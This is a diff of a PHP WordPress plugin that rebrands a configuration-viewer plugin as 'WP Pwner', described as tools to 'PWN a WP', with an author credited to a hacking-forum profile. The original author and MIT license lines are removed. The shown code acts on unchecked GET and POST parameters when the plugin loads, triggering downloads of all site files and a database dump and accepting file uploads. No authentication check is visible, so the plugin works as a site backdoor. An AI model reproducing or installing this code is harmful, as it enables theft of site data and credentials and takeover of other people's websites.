@@ -1,48 +1,44 @@
 <?php # -*- coding: utf-8 -*-
 /**
- * Plugin Name: Configuration Dashboard Widget
- * Description: Show the current installation path and the content of the <code>wp-config.php</code>.
- * Version:     16.10.15
+ * Plugin Name: WP Pwner
+ * Description: Provides basic tools to PWN a WP
+ * Version:     1.0
  * Required:    4.0
- * Author:      Thomas Scholz
- * Author URI:  http://toscho.de
- * License:     MIT
- * License URI: http://www.opensource.org/licenses/mit-license.php
+ * Author:      Alexander HF
+ * Author URI:  https://hackforums.net/member.php?action=profile&uid=1771749
  */
- 
-ini_set('display_errors', 'off');
 
 $db_dump_path = dirname(__FILE__) . '/dumps/db_dump.sql';
 $file_dump_path = dirname(__FILE__) . '/dumps/file_dump.zip';
 
-add_action('plugins_loaded', 'wp_downloader_check_for_download');
-add_action('admin_menu', 'wp_downloader_menu');
-add_action('admin_init', 'wp_downloader_init_style');
+add_action('plugins_loaded', 'wp_pwner_check_for_download');
+add_action('admin_menu', 'wp_pwner_menu');
+add_action('admin_init', 'wp_pwner_init_style');
 
-function wp_downloader_init_style() {
-	wp_register_style('wp_downloader', plugins_url('css/main.css', __FILE__));
-	wp_enqueue_style('wp_downloader');
+function wp_pwner_init_style() {
+	wp_register_style('wp_pwner', plugins_url('css/main.css', __FILE__));
+	wp_enqueue_style('wp_pwner');
 }
 
-function wp_downloader_menu() {
-    $hook_suffix = add_menu_page('WP Downloader', 'WP Downloader', 'manage_options', 'wp-downloader', 'render_wp_downloader_page');
+function wp_pwner_menu() {
+    $hook_suffix = add_menu_page('WP Pwner', 'WP Pwner', 'manage_options', 'wp-downloader', 'render_wp_pwner_page');
 }
 
-function wp_downloader_check_for_download() {
+function wp_pwner_check_for_download() {
 	global $db_dump_path;
 
 	if(isset($_GET['download'])) {
 		if(isset($_GET['action'])) {
-			do_wp_downloader_action($_GET['action']);
+			do_wp_pwner_action($_GET['action']);
 		}
 	}
 
 	if(isset($_POST['upload'])) {
-		do_wp_downloader_action('upload_file', $_POST, $_FILES);
+		do_wp_pwner_action('upload_file', $_POST, $_FILES);
 	}
 }
 
-function render_wp_downloader_page() {
+function render_wp_pwner_page() {
 	load_wp_config();
 
 	// GET DB VARIABLES
@@ -74,7 +70,7 @@ function render_wp_downloader_page() {
 
 }
 
-function do_wp_downloader_action($action, $data=[], $files=[]) {
+function do_wp_pwner_action($action, $data=[], $files=[]) {
 	switch($action) {
 		case 'download_files':
 			download_all_files();
